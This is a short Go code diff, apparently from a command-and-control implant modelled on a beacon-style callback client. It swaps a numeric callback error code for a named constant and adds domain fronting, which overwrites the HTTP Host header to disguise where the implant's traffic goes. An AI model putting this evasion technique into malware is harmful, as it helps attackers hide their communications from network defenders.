@@ -25,10 +25,12 @@ func init() {
 	if config.ProxyUrl != "" {
 		err := httpRequest.SetProxyUrl(config.ProxyUrl)
 		if err != nil {
-			// 31 CALLBACK_ERROR
-			PushResult(31, []byte(util.Sprintf("error proxy url: %s", config.ProxyUrl)))
+			PushResult(CALLBACK_ERROR, []byte(util.Sprintf("error proxy url: %s", config.ProxyUrl)))
 			os.Exit(1)
 		}
+	}
+	if config.DomainFrontHost != "" {
+		config.HttpHeaders["Host"] = config.DomainFrontHost
 	}
 	trans, _ := httpRequest.Client().Transport.(*http.Transport)
 	trans.MaxIdleConns = 20
